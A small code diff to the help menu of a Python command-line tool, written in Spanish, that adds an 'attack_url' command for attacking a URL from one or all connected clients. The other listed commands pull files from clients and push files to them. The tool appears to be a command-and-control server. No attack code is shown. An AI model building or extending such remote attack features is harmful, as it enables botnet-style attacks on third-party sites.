@@ -43,6 +43,7 @@ class HelpCmdCommand(CommandSet):
                 ("add_firewall_rule", "Agrega una regla de firewall en los clientes"),
                 ("get_files_by_extension", "Solicita archivos por extensión desde los clientes"),
                 ("send_file", "Envía un archivo desde el servidor a los clientes"),
+                ("attack_url", "Ataca a una URL en uno o todos los clientes"),
                 ("help_cmd", "Muestra esta ayuda"),
                 ("exit", "Cierra el CLI")
             ]
